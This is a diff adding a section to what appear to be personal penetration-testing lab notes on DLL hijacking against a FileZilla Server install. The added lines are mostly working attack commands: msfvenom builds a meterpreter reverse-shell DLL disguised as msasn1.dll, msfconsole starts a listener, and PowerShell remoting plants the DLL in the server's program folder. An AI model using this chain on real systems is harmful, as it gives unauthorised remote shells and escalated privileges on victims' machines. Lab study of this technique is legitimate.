@@ -976,6 +976,30 @@ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
   * `sc stop dllsvc`
   * `sc start dllsvc`
 
+## OR..
+
+In CLIENT01 process monitor:
+
+![](<../.gitbook/assets/image (5).png>)
+
+* Create malicious msasn1.dll & save to C:\Program Files\FileZilla Server --> Rev shell
+  * ```powershell
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o msasn1.dll
+    ```
+  * ```powershell
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"
+    ```
+    *
+
+        <figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+
+  * Start Filezilla server
+* ```powershell
+  Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02
+  copy-item C:\shares\home\mary\msasn1.dll -destination "C:\Program Files\FileZilla Server\msasn1.dll"
+  ```
+
 </details>
 
 <details>
